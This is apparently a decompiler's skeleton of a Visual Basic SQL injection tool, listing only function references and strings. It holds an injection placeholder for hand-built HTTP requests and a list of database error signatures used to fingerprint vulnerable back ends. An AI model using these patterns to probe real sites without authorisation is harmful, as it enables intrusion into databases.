Attribute VB_Name = "general"
' This code module rebuilt by VBRezQ v3.3a.  2-Feb-2012 / 19:56:10
Option Explicit 
 
' Declare Function ShellExecuteA Lib "shell32.dll" ()
 
' Declare Function DeleteFileA Lib "kernel32" ()
 
' Declare Function CopyFileA Lib "kernel32" ()
 
' Declare Function LockWindowUpdate Lib "user32" ()
 
' Declare Function SendMessageA Lib "user32" ()
 
' Declare Function InitCommonControlsEx Lib "comctl32.dll" ()
 
'Sub Subr_132()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaOnError
'N  * API ref: InitCommonControlsEx
'N  * ref: __vbaSetSystemError
'N  * ref: Err
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaOnError
'N  * ref: __vbaFreeObj
'End Sub
 
'Sub Subr_133()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: FileLen(
'N  * ref: __vbaFreeStr
'N  * ref: Err
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'End Sub
 
'Sub Subr_134()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarForInit
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaNew2
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstLt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI2Var
'N  * ref: __vbaVarForNext
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_135()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaOnError
'N  * ref: Trim(
'N  * ref: LCase(
'N  * ref: "http://"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "/"
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_136()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVarList
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVar
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: Left(
'N  * ref: __vbaAryUnlock
'N  * ref: "HTTP/1."
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: __vbaAryUnlock
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForNext
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_137()
'N  * ref: __vbaExceptHandler
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaRefVarAry
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: LCase(
'N  * ref: __vbaAryUnlock
'N  * ref: "server:*"
'N  * ref: __vbaVarLikeVar
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: __vbaAryUnlock
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Web Server: "
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaStrCat
'N  * ref: "Web Server: "
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: "Web Server: "
'N  * ref: Subr_143
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: LCase(
'N  * ref: __vbaAryUnlock
'N  * ref: "x-powered-by:*"
'N  * ref: __vbaVarLikeVar
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaVarIndexLoadRefLock
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: __vbaAryUnlock
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Powered-by: "
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaStrCat
'N  * ref: "Powered-by: "
'N  * ref: __vbaStrMove
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeStr
'N  * ref: "Powered-by: "
'N  * ref: Subr_143
'N  * ref: __vbaVarForNext
'N  * ref: __vbaFreeVar
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_138()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarDup
'N  * ref: IsMissing(
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: Subr_168
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarDup
'N  * ref: Subr_145
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCat
'N  * ref: "POST "
'N  * ref: " HTTP/1.1"
'N  * ref: vbCrLf
'N  * ref: "Host: "
'N  * ref: vbCrLf
'N  * ref: "Content-Type: application/x-www-form-urlencoded"
'N  * ref: vbCrLf
'N  * ref: "Content-Length: %Conteng_Length%"
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: vbCrLf
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: vbCrLf
'N  * ref: "Connection: Close"
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "%20"
'N  * ref: " "
'N  * ref: Replace(
'N  * ref: __vbaStrCat
'N  * ref: "GET "
'N  * ref: " HTTP/1.1"
'N  * ref: vbCrLf
'N  * ref: "Host: "
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: vbCrLf
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "Connection: Close"
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "%Inject_Here%"
'N  * ref: Replace(
'N  * ref: "Authorization"
'N  * ref: __vbaVarDup
'N  * ref: Subr_152
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "%Digest%"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "%"
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrVarVal
'N  * ref: Split(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaVarMove
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: Split(
'N  * ref: __vbaVarIndexLoad
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarMove
'N  * ref: Mid(
'N  * ref: "GET"
'N  * ref: __vbaVarDup
'N  * ref: "POST"
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: Subr_753
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaStrVarVal
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStr
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "%Conteng_Length%"
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_139()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarVargNofree
'N  * ref: "Microsoft OLE DB Provider for SQL Server"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "MSSQL 2005 with error"
'N  * ref: __vbaVarCopy
'N  * ref: "Microsoft JET Database Engine"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "MSAccess"
'N  * ref: __vbaVarCopy
'N  * ref: "ODBC SQL Server Driver"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "MSSQL 2000 with error"
'N  * ref: __vbaVarCopy
'N  * ref: "ODBC Microsoft Access Driver"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "MSAccess"
'N  * ref: __vbaVarCopy
'N  * ref: "Microsoft OLE DB Provider for ODBC Drivers"
'N  * ref: "[MySQL][ODBC"
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "MySQL"
'N  * ref: __vbaVarCopy
'N  * ref: "check the manual that corresponds to your MySQL server version for the right syntax to use"
'N  * ref: "supplied argument is not a valid MySQL result resource"
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "MySQL"
'N  * ref: __vbaVarCopy
'N  * ref: "Microsoft SQL Native Client"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "MSSQL 2005 with error"
'N  * ref: __vbaVarCopy
'N  * ref: "Unclosed quotation mark "
'N  * ref: "the character string"
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "MSSQL 2000 with error"
'N  * ref: __vbaVarCopy
'N  * ref: "[Oracle][ODBC][Ora]"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "Oracle"
'N  * ref: __vbaVarCopy
'N  * ref: "[Sybase][ODBC"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaVarCopy
'N  * ref: "Unclosed quote before the character string"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "Sybase (ASE)"
'N  * ref: __vbaVarCopy
'N  * ref: "*ORA-?????: *"
'N  * ref: __vbaVarLikeVar
'N  * ref: __vbaBoolVarNull
'N  * ref: "Oracle"
'N  * ref: __vbaVarCopy
'N  * ref: "[SQLServer JDBC Driver][SQLServer]"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "MSSQL 2000 with error"
'N  * ref: __vbaVarCopy
'N  * ref: "[Driver ODBC para Microsoft Access]"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "MSAccess"
'N  * ref: __vbaVarCopy
'N  * ref: "supplied argument is not a valid PostgreSQL result"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "PostgreSQL"
'N  * ref: __vbaVarCopy
'N  * ref: "unterminated quoted string at or near"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "PostgreSQL"
'N  * ref: __vbaVarCopy
'N  * ref: "pg_query() [<a href='function.pg-query'>function.pg-query</a>]"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "PostgreSQL"
'N  * ref: __vbaVarCopy
'N  * ref: "<b>Warning</b>:  mysql_num_rows()"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "MySQL"
'N  * ref: __vbaVarCopy
'N  * ref: "<b>Warning</b>:  mysql_free_result()"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "MySQL"
'N  * ref: __vbaVarCopy
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_140()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaVarDup
'N  * ref: "\!star!/"
'N  * ref: "*"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaInStrVar
'N  * ref: "(char*)"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "(*)"
'N  * ref: "(char*)"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: "(firstline*)"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "(*)"
'N  * ref: "(firstline*)"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: "(*"
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: "*"
'N  * ref: __vbaStrVarVal
'N  * ref: InstrRev(
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarTstLe
'N  * ref: "*"
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: "*"
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarTstLe
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: __vbaVarSub
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarCmpEq
'N  * ref: IIf(
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCmpLe
'N  * ref: __vbaVarCmpLe
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: "*"
'N  * ref: "\!star!/"
'N  * ref: __vbaStrVarVal
'N  * ref: Replace(
'N  * ref: __vbaFreeStr
'N  * ref: __vbaVarTstEq
'N  * ref: vbCr
'N  * ref: vbLf
'N  * ref: __vbaVarCmpLt
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaVarCmpGe
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: vbCr
'N  * ref: vbLf
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCopy
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_141()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVargVar
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaI2Var
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: DoEvents
'N  * ref: __vbaNew2
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_142()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: Timer
'N  * ref: __vbaFpR4
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI2Var
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: DoEvents
'N  * ref: __vbaNew2
'N  * ref: __vbaLateIdCall
'N  * ref: Timer
'N  * ref: __vbaFpR4
'N  * ref: "I got bored of waiting more than "
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: " seconds! (request timed out)"
'N  * ref: Subr_143
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFPException
'End Sub
 
'Sub Subr_143()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaOnError
'N  * ref: __vbaLenVar
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaOnError
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI4Var
'N  * API ref: LockWindowUpdate
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarCopy
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaLenBstr
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaLenBstr
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaNew2
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaLenBstr
'N  * ref: Left(
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: InstrRev(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarAdd
'N  * ref: IIf(
'N  * ref: __vbaI4Var
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaLenBstr
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: RGB(
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: RGB(
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: Right(
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaVarDup
'N  * ref: vbCrLf
'N  * ref: __vbaVarDup
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarCmpNe
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarAnd
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: vbCrLf
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaNew2
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * API ref: LockWindowUpdate
'N  * ref: __vbaSetSystemError
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaVarMove
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_144()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: __vbaInStr
'N  * ref: __vbaStrMove
'N  * ref: "HTTP/1.1 "
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaLenBstr
'N  * ref: Right(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: DoEvents
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaErrorOverflow
'End Sub
 
'Sub Subr_145()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaVarDup
'N  * ref: __vbaOnError
'N  * ref: "://"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarCopy
'N  * ref: "/"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: ":"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVar
'N  * ref: ":"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Left(
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarSub
'N  * ref: __vbaI4Var
'N  * ref: Right(
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaVargVarCopy
'N  * ref: LCase(
'N  * ref: __vbaVarMove
'N  * ref: "http://"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVargVarMove
'N  * ref: "https://"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVargVarMove
'N  * ref: "ftp://"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaLenVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: Mid(
'N  * ref: __vbaVargVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstEq
'N  * ref: "/"
'N  * ref: __vbaVargVarCopy
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVargVarCopy
'N  * ref: "?"
